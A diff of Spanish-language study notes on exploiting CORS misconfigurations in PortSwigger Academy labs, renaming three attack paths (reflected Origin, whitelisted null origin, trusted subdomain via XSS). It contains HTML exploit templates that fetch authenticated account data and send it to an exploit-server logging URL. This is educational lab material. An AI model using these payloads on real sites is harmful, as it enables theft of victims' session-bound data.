@@ -31,10 +31,10 @@ tags:
 Para **robar datos autenticados** se cumplen **las 3 juntas** (en la respuesta del endpoint de datos):
 
 1. **`Access-Control-Allow-Credentials: true`** — sin esto no hay robo de sesión.
-2. **ACAO confía en un origen que controlás** — refleja tu `Origin` (mandás `Origin: https://evil.com` y vuelve igual) · acepta `Origin: null` · o confía en **subdominios** (incl. HTTP).
+2. **`Access-Control-Allow-Origin` confía en un origen que controlás** — refleja tu `Origin` (mandás `Origin: https://evil.com` y vuelve igual) · acepta `Origin: null` · o confía en **subdominios** (incl. HTTP).
 3. Tu JS hace **`fetch(..., {credentials:'include'})`** (para que viajen las cookies de la víctima).
 
-> [!warning] 🚩 `ACAO: *` NO sirve para robar sesión
+> [!warning] 🚩 `Access-Control-Allow-Origin: *` NO sirve para robar sesión
 > `*` no convive con credenciales: el navegador **bloquea** la respuesta con `credentials:'include'` → solo data **pública/intranet**. Para robar cuenta necesitás **reflejo / `null` + `Allow-Credentials: true`**.
 
 ## 🧪 Cómo cazarlo (metodología)
@@ -51,12 +51,14 @@ Para **robar datos autenticados** se cumplen **las 3 juntas** (en la respuesta d
 
 ---
 
-## 🧩 Los 3 sabores (según en qué confía el server)
+## 🧩 Alternativas para que el `Access-Control-Allow-Origin` confíe en tu origen
 
-### 1) Reflejo del `Origin` (trusts all origins)
+> Esto **no** son 3 vulns distintas: son **3 caminos alternativos** para cumplir la condición #2 de arriba (que el server acepte un origen que controlás). Te basta con que **UNA** se dé. Probalas en este orden (de más común/directa a más rara):
+
+### Alternativa A — Reflejo del `Origin` (trusts all origins)
 El server toma tu header `Origin` y lo **devuelve tal cual** en `Access-Control-Allow-Origin`, con `Allow-Credentials: true`. **El más directo:** un `<script>` en el exploit server con un `fetch(..., {credentials:'include'})` a `/accountDetails`.
 
-### 2) `Origin: null` whitelisteado
+### Alternativa B — `Origin: null` whitelisteado
 Algunos devs whitelistean `null` (creyendo que es "seguro" para requests locales/sandbox). Vos **generás** un origen `null` y lo explotás. Formas de conseguir `null` (de las notas previas, todas válidas):
 - **Iframe *sandboxed*** (`sandbox="allow-scripts allow-forms"` → sin `allow-same-origin`) con `srcdoc`. ← el del lab.
 - **Cross-origin redirect** (302 a través de un salto).
@@ -66,7 +68,7 @@ Algunos devs whitelistean `null` (creyendo que es "seguro" para requests locales
 > [!warning] Repeater ≠ exploit real
 > En **Repeater** "forzás" `null` escribiendo el header `Origin: null` a mano (sirve para **confirmar**). En un **exploit real** el `Origin` lo pone el navegador de la víctima: tenés que hacer que la request **nazca** de un contexto sin origen (sandbox/`data:`/`file:`/redirect). PoC completa con las 4 formas → [[vulnerabilities/005-cors/examples/bypass-origin-null|ejemplo: bypass Origin null]].
 
-### 3) Subdominios / protocolos inseguros (trusts all subdomains)
+### Alternativa C — Subdominios / protocolos inseguros (trusts all subdomains)
 El server confía en **cualquier subdominio, incluso por HTTP**. No podés MITM en el lab, así que necesitás **inyectar JS en un subdominio confiable** → un **XSS en un subdominio** (p. ej. `stock.target` con `productId` reflejado). Desde ese origen confiable, el `fetch` a la API pasa el chequeo de CORS.
 
 > [!tip] CORS ⇄ XSS
@@ -76,7 +78,7 @@ El server confía en **cualquier subdominio, incluso por HTTP**. No podés MITM 
 
 ## 🐍 Plantillas (reemplazá lo <mark>resaltado</mark>)
 
-**1) Reflejo de Origin (trusts all origins) — robar la respuesta autenticada** → [[vulnerabilities/005-cors/examples/robar-apikey-origin-reflejado|ejemplo completo]]
+**A) Reflejo de Origin (trusts all origins) — robar la respuesta autenticada** → [[vulnerabilities/005-cors/examples/robar-apikey-origin-reflejado|ejemplo completo]]
 ```html
 <script>
 fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
@@ -85,7 +87,7 @@ fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: '
 </script>
 ```
 
-**2) `Origin: null` — iframe sandboxed genera el origen `null`** → [[vulnerabilities/005-cors/examples/bypass-origin-null|ejemplo completo]]
+**B) `Origin: null` — iframe sandboxed genera el origen `null`** → [[vulnerabilities/005-cors/examples/bypass-origin-null|ejemplo completo]]
 ```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
     fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
@@ -94,7 +96,7 @@ fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: '
 </script>"></iframe>
 ```
 
-**3) Trusts subdomains → XSS en subdominio HTTP como trampolín** → [[vulnerabilities/005-cors/examples/pivot-subdominio-http-via-xss|ejemplo completo]]
+**C) Trusts subdomains → XSS en subdominio HTTP como trampolín** → [[vulnerabilities/005-cors/examples/pivot-subdominio-http-via-xss|ejemplo completo]]
 ```html
 <script>
 document.location="http://stock.TARGET.web-security-academy.net/?productId=4<script>fetch('https://TARGET.web-security-academy.net/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://EXPLOIT.exploit-server.net/log?key='%2bencodeURIComponent(d))%3c/script>&storeId=1"
@@ -111,7 +113,7 @@ Origin: https://evil.com
 
 ## 🌐 Curiosidad — CORS sin credenciales / intranet
 
-Aunque no puedas robar sesión (`ACAO: *`, sin credenciales), una página atacante puede usar `fetch` para **escanear la red interna** de la víctima y **leer recursos internos** que confíen en `*` (dashboards, APIs sin auth accesibles solo desde la LAN de la víctima). Es el caso "Intranets and CORS without credentials". Impacto: acceso a recursos internos, no robo de cuenta.
+Aunque no puedas robar sesión (`Access-Control-Allow-Origin: *`, sin credenciales), una página atacante puede usar `fetch` para **escanear la red interna** de la víctima y **leer recursos internos** que confíen en `*` (dashboards, APIs sin auth accesibles solo desde la LAN de la víctima). Es el caso "Intranets and CORS without credentials". Impacto: acceso a recursos internos, no robo de cuenta.
 
 > [!note] Relación con otras vulns
 > - **CSRF** — CORS **no** lo previene; y si el endpoint solo permite **escribir**, es CSRF, no CORS → [[vulnerabilities/003-csrf/README|CSRF]].
